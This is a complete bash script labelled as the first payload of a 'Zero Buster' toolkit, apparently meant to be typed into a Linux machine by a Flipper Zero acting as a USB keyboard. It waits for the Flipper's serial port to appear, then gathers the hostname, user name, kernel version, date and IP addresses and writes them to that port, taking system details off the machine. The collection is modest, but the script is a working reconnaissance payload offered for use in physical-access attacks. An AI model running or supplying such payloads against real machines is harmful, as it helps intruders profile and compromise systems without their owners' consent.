#!/bin/bash
# ==============================================================================
# Zero Buster - Payload 01: Linux System Reconnaissance
# ==============================================================================
# Wait for the Flipper Zero to switch from HID to CDC, detect the
# /dev/ttyACM* serial port, and send basic diagnostic telemetry.
# ==============================================================================

for i in $(seq 1 60); do
    dev=$(ls -t /dev/ttyACM* 2>/dev/null | head -n1)
    [ -n "$dev" ] && break
    sleep 0.2
done

if [ -n "$dev" ]; then
    sleep 0.5
    (
        echo '=== ZERO BUSTER (LINUX RECON) ==='
        echo "Host: $(hostname)"
        echo "User: $(whoami)"
        echo "Kernel: $(uname -r)"
        echo "Date: $(date)"
        echo '=== Network ==='
        ip -4 -br a 2>/dev/null
        echo '<<<EOF>>>'
    ) > "$dev"
fi
